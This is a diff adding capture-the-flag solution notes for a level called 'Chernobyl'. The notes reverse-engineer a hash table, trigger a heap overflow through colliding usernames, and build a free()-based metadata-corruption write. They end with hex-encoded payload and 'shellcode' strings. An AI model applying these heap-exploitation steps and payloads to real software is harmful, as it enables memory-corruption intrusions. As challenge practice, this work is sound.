@@ -1,0 +1,132 @@
+### Chernobyl ###
+
+See the disassembly in its own file
+
+So the vulnerability is probably either in the hash table implementation, or in malloc/free
+Let's check the hash table first.
+
+Would it fail if we create too many entries in the hash table?
+=> Apparently not
+
+# Hash table layout
+
+The key to our table is usernames, hashed with a custom function
+
+Head (0xA bytes):
+
+| New elements since last rehash | x (number of chains param) (0300) | y (size of cell param) (0500) | First 2^(x+1) bytes ptr | Second 2^(x+1) bytes ptr |
+
+First area (2^(x+1) bytes):
+
+| ptr to (0x12*y bytes) chain 0  | .... | ptr to (0x12*y bytes) chain X |
+
+Second area (2^(x+1) bytes):
+
+| 0000 | ... | 0000 |
+
+The first area is our array of cell chain pointers, and the second area is the number of cell in each chains.
+A chain is an array of cells, not actually a linked list.
+
+The hash algorithm is so that incrementing the username decrements the target chain
+
+Names that go in chain 0x10:
+a
+q
+ab
+ar
+aaa
+aaq
+
+That's 6 of them, and there are only 5 cells per chain
+
+new a a;new q a;new ab a;new ar a;new aaa a;new aaq a;new x1 a;new x2 a;new x3 a;new x4 a;new x5 a;new x6 a;
+
+=> Yep, we do get a heap overflow!
+=> The way the memory is laid out, our cells are at the end, so we can only overwrite over cells and malloc metadata
+=> So now we just need to get someone to call malloc/free on that and have it trip up
+==> rehash calls free, and is called by add_to_table
+==> When exactly is rehash called, what exactly does it free?
+===> It rehashes the first time when we add the 12th element
+
+But wait, can we actually overwrite anything important?
+Well, if we're in the last chain, we can't overwrite shit. But all other cells can overwrite malloc metadata of their next cell.
+So here's 6 names that go in chain 0xF, plus some random names for a rehash:
+
+new b a;new r a;new ac a;new as a;new aab a;new aar a;new y1 a;new y2 a;new x3 a;new x4 a;new x5 a;new x6 a;
+
+=> So we did corrupt things, but we triggered the "Heap exhausted, aborting" message. That's a start.
+=> Now we'll want to step into free and understand how it crashes, how it works, how to exploit
+==> It's actually the first malloc call that crashes. Can we exploit malloc?
+
+So malloc actually seems to check that the next pointer isn't smaller than the heap start before following it
+If we can't find a way to exploit malloc after documenting it, we might have to fake a good situation for malloc that still makes free crash
+Maybe if we create a large enough not used chunk but with bogus prev/next it'll work?
+
+=> Alright so if we create a not used block with a negative size, would the new block from the split land in the code section?
+==> Nope, we don't use the current size to determine where to split
+
+So yeah, looks like malloc is bulletproof.
+Wait, we could say that the next chunk is around 0xFFFE and have malloc overflow a write near 0x10, where the RET of __trap_interrupt is
+=> So we can get malloc to return a pointer to 0x4, but the next call to malloc then sees the next chunk from 0xFFFE is 0x0 and aborts with heap exhausted
+There's still the possibility of overwriting multiple blocks or changing both size and next so that the last malloc goes to 0xFFFE
+
+We could also try creating blocks with overlapping metadata and see what happens but I don't think that's exploitable with malloc alone.
+
+So if malloc isn't exploitable, we need to corrupt chunks in a way that works with malloc but is exploitable with free
+
+Well distributed hashes that cause a rehash:
+new a a;new b a;new c a;new d a;new e a;new f a;new g a;new h a;new i a;new j a;new k a; new l a;
+
+=> Okay, so we could use names so that it's well distributed with x=3 but overflows with x=4
+=> It means that it would overflow in the middle of rehash, while freeing stuff. Then we can try exploiting free
+
+==> TODO: Analyze free, try to find a vuln
+===> We have a wonderful opportunity to corrupt stuff here, free doesn't walk the chunks except checking the prev/next without safeguards
+
+=> Start with an "already rehashed once" table: 
+reset;let 4B7a=4;c
+
+=> Names that go in the second to last bucket after rehash:
+new B a;new R a;new AC a;new AS a;new AAB a;new AAR a;
+
+=> Names that only overflow after rehash
+==> Impossible!
+
+=> So we need to corrupt only the prev pointer and leave next in a semi consistent state that malloc won't complain about
+
+new aa a;new aq a;new aab a;new aar a;new b a;new r a;new y1 a;new z2 a;new x3 a;new x4 a;new x5 a;new x6 a;
+
+=> Or, we could overwrite a malloc chunk to have a giant unused size, malloc will split it and never bother us again.
+=> But free still refers to the same old chunks that we've overwritten left and right, so we could corrupt things at will for free while malloc is busy
+
+=> Corruption of the prev with free
+=> We pass X as prev, Y as next and Z as size. If *(X+4) is even, *(X+2) becomes *Y and *(X+4) becomes *(X+4)+Z+6 
+
+new 0 a;new aa a;new aq a;new AA a;new AQ a;new XXXXXX a;new x1 a;new x2 a;new x3 a;new x4 a;new x5 a;new x6 a;
+
+Stub for adding one account:
+6e657720 <username> 20613b
+
+Prefix:
+new 0 a;new 8 a;new @ a;new H a;new P a;new 
+6e6577203020613b6e6577203820613b6e6577204020613b6e6577204820613b6e6577205020613b6e657720
+
+Prev | Next | Size
+8849DC52B7
+
+Suffix 1:
+ a;new 
+20613b6e657720
+
+Payload:
+3e8083503040f24c
+
+Suffix 2:
+ a;new 2 a;new : a;new B a;new < a;new C a
+20613b6e6577203220613b6e6577203a20613b6e6577204220613b6e6577203c20613b6e657720432061
+
+Full shellcode:
+6e6577203020613b6e6577203820613b6e6577204020613b6e6577204820613b6e6577205020613b6e65772088497C52B720613b6e6577203e80a3513040f24c20613b6e6577203220613b6e6577203a20613b6e6577204220613b6e6577203b20613b6e657720432061
+
+6e6577203020613b6e6577203820613b6e6577204020613b6e6577204820613b6e6577205020613b6e6577208849DC52B720613b6e6577203e8083503040f24c20613b6e6577203220613b6e6577203a20613b6e6577204220613b6e6577203e20613b6e657720432061
+ 
